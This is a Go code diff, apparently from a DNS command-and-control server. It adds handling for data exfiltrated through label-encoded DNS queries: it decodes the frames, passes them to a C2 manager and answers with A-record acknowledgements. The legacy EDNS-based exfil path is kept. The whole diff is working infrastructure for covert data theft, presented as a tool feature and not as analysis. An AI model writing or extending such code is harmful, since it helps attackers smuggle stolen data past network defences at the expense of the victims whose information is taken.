@@ -254,8 +254,30 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 
 	q := msg.Questions[0]
 
-	// Detect dedicated exfil client traffic first (uses EDNS metadata + A queries)
+	// Detect dedicated exfil client traffic first (label framing or legacy EDNS metadata)
 	if q.Type == 1 {
+		domainHints := buildExfilDomainHints(cfg.Domain, c2Manager.GetKnownDomains())
+		if frame, matched, frameErr := parseLabelEncodedExfilFrame(q.Name, domainHints); matched {
+			ack := false
+			if frameErr == nil {
+				ack, err = c2Manager.ProcessExfilFrame(frame, clientIP)
+			} else {
+				err = frameErr
+			}
+			if err != nil && debugMode {
+				logf("[Exfil] Frame processing error: %v", err)
+			}
+			answers := []DNSResourceRecord{{
+				Name:  q.Name,
+				Type:  1,
+				Class: 1,
+				TTL:   1,
+				RData: ackIPAddress(cfg.SvrAddr, err == nil && ack),
+			}}
+			respMsg := buildResponse(msg, answers, 0)
+			return serializeMessage(respMsg), nil
+		}
+
 		meta, metaErr := extractExfilMetadata(msg)
 		if metaErr != nil {
 			if debugMode {
@@ -269,7 +291,7 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 					logf("[Exfil] Unable to extract base36 payload from %s", q.Name)
 				}
 			} else {
-				ack, err = c2Manager.handleExfilChunk(encoded, meta, clientIP)
+				ack, err = c2Manager.handleExfilChunk(encoded, meta, clientIP, nil)
 				if err != nil && debugMode {
 					logf("[Exfil] Chunk processing error: %v", err)
 				}
